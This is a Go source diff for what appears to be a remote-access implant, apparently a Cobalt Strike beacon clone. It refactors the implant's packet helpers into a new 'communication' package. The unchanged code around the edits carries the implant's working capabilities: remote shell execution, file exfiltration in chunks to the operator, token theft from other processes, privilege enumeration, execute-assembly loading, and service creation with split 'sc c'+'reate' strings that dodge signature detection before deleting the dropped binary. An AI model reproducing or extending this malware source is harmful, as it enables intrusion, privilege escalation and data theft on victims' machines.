@@ -10,6 +10,7 @@ import (
 	"github.com/shirou/gopsutil/process"
 	"io"
 	"io/ioutil"
+	"main/communication"
 	"main/config"
 	"main/crypt"
 	"main/packet"
@@ -31,7 +32,7 @@ func ParseCommandShell(b []byte) (string, []byte, error) {
 	if err != nil {
 		return "", nil, err
 	}
-	pathLen := packet.ReadInt(pathLenBytes)
+	pathLen := communication.ReadInt(pathLenBytes)
 	path := make([]byte, pathLen)
 	_, err = buf.Read(path)
 	if err != nil {
@@ -44,7 +45,7 @@ func ParseCommandShell(b []byte) (string, []byte, error) {
 		return "", nil, err
 	}
 
-	cmdLen := packet.ReadInt(cmdLenBytes)
+	cmdLen := communication.ReadInt(cmdLenBytes)
 	cmd := make([]byte, cmdLen)
 	buf.Read(cmd)
 
@@ -57,7 +58,7 @@ func ParseCommandUpload(b []byte) ([]byte, []byte) {
 	buf := bytes.NewBuffer(b)
 	filePathLenBytes := make([]byte, 4)
 	buf.Read(filePathLenBytes)
-	filePathLen := packet.ReadInt(filePathLenBytes)
+	filePathLen := communication.ReadInt(filePathLenBytes)
 	filePath := make([]byte, filePathLen)
 	buf.Read(filePath)
 	fileContent := buf.Bytes()
@@ -75,7 +76,7 @@ func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
 		go func() {
 			_, err = packet.Run(shellBuf, Token)
 			if err != nil {
-				packet.ErrorProcess(err)
+				communication.ErrorProcess(err)
 			}
 			return
 		}()
@@ -83,7 +84,7 @@ func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
 		go func() {
 			_, err = packet.Shell(shellPath, shellBuf, Token)
 			if err != nil {
-				packet.ErrorProcess(err)
+				communication.ErrorProcess(err)
 			}
 			return
 		}()
@@ -131,20 +132,20 @@ func CmdDownload(cmdBuf []byte) ([]byte, error) {
 	go func() {
 		fileInfo, err := os.Stat(strFilePath)
 		if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 			return
 		}
 		fileLen := fileInfo.Size()
 		test := int(fileLen)
-		fileLenBytes := packet.WriteInt(test)
+		fileLenBytes := communication.WriteInt(test)
 		requestID := crypt.RandomInt(10000, 99999)
-		requestIDBytes := packet.WriteInt(requestID)
+		requestIDBytes := communication.WriteInt(requestID)
 		result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
-		packet.DataProcess(2, result)
+		communication.DataProcess(2, result)
 
 		fileHandle, err := os.Open(strFilePath)
 		if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 			return
 		}
 		var fileContent []byte
@@ -159,10 +160,10 @@ func CmdDownload(cmdBuf []byte) ([]byte, error) {
 			}
 			fileContent = fileBuf[:n]
 			result = util.BytesCombine(requestIDBytes, fileContent)
-			packet.DataProcess(8, result)
+			communication.DataProcess(8, result)
 			time.Sleep(50 * time.Millisecond)
 		}
-		packet.DataProcess(9, requestIDBytes)
+		communication.DataProcess(9, requestIDBytes)
 	}()
 
 	return []byte("[+] Downloading " + strFilePath), nil
@@ -255,7 +256,7 @@ func CmdCd(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdSleep(cmdBuf []byte) ([]byte, error) {
-	sleep := packet.ReadInt(cmdBuf[:4])
+	sleep := communication.ReadInt(cmdBuf[:4])
 	if sleep != 'd' {
 		config.WaitTime = time.Duration(sleep) * time.Millisecond
 		return []byte("Sleep time changes to " + strconv.Itoa(int(sleep)/1000) + " seconds"), nil
@@ -273,7 +274,7 @@ func CmdPwd() ([]byte, error) {
 }
 
 func CmdPause(cmdBuf []byte) ([]byte, error) {
-	pauseTime := packet.ReadInt(cmdBuf)
+	pauseTime := communication.ReadInt(cmdBuf)
 	fmt.Println(fmt.Sprintf("Pause time: %d", pauseTime))
 	time.Sleep(time.Duration(pauseTime) * time.Millisecond)
 	return []byte(fmt.Sprintf("Pause for %d millisecond", pauseTime)), nil
@@ -303,7 +304,7 @@ func CmdGetUid() ([]byte, error) {
 }
 
 func CmdGetPrivs(b []byte, token uintptr) ([]byte, error) {
-	privCnt := int(packet.ReadShort(b[:2]))
+	privCnt := int(communication.ReadShort(b[:2]))
 	buf := bytes.NewBuffer(b[2:])
 	privs := make([]string, privCnt)
 	for i := 0; i < privCnt; i++ {
@@ -317,7 +318,7 @@ func CmdGetPrivs(b []byte, token uintptr) ([]byte, error) {
 }
 
 func CmdStealToken(cmdBuf []byte) (uintptr, []byte, error) {
-	pid := packet.ReadInt(cmdBuf[:4])
+	pid := communication.ReadInt(cmdBuf[:4])
 	return packet.Steal_token(pid)
 }
 
@@ -370,7 +371,7 @@ func CmdPs(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdKill(cmdBuf []byte) ([]byte, error) {
-	pid := packet.ReadInt(cmdBuf[:4])
+	pid := communication.ReadInt(cmdBuf[:4])
 	return packet.KillProcess(pid)
 }
 
@@ -549,9 +550,9 @@ func ParseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, err
 	_, _ = buf.Read(callbackTypeByte)
 	_, _ = buf.Read(sleepTimeByte)
 	_, _ = buf.Read(offset)
-	callBackType := packet.ReadShort(callbackTypeByte)
-	sleepTime := packet.ReadShort(sleepTimeByte)
-	offSet := packet.ReadInt(offset)
+	callBackType := communication.ReadShort(callbackTypeByte)
+	sleepTime := communication.ReadShort(sleepTimeByte)
+	offSet := communication.ReadInt(offset)
 	description, err := util.ParseAnArg(buf)
 	csharp, err := util.ParseAnArg(buf)
 	dll := buf.Bytes()
@@ -683,7 +684,7 @@ func CmdService(Token uintptr) ([]byte, error) {
 	go func() {
 		_, err := Upload(filePath, data)
 		if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 			return
 		}
 
@@ -691,31 +692,31 @@ func CmdService(Token uintptr) ([]byte, error) {
 
 		_, err = packet.Run([]byte("sc c"+"reate NetService bin"+"path= \""+filePath+" "+currentFile+"\""), Token)
 		if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 			return
 		}
 
 		_, err = packet.Run([]byte("sc s"+"tart NetService"), Token)
 		if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 			return
 		}
 
 		_, err = packet.Run([]byte("sc s"+"top NetService"), Token)
 		if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 			return
 		}
 
 		_, err = packet.Run([]byte("sc d"+"elete NetService"), Token)
 		if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 			return
 		}
 
 		_, err = CmdRm([]byte(filePath))
 		if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 			return
 		}
 	}()
